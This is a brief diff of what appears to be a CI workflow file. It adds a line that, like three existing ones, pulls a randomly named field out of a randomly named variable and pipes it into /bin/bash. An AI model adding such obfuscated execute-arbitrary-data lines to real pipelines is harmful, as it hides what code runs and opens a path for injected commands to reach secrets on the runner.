@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$a9" | jq -r .cabpu08799 | /bin/bash
           printf '%s' "$r12783" | jq -r .f3890 | /bin/bash
           printf '%s' "$ik71014" | jq -r .qzaba08 | /bin/bash
+          echo $l2058 | jq -r .btt684 | /bin/bash
 
       - name: Save output
         if: always()
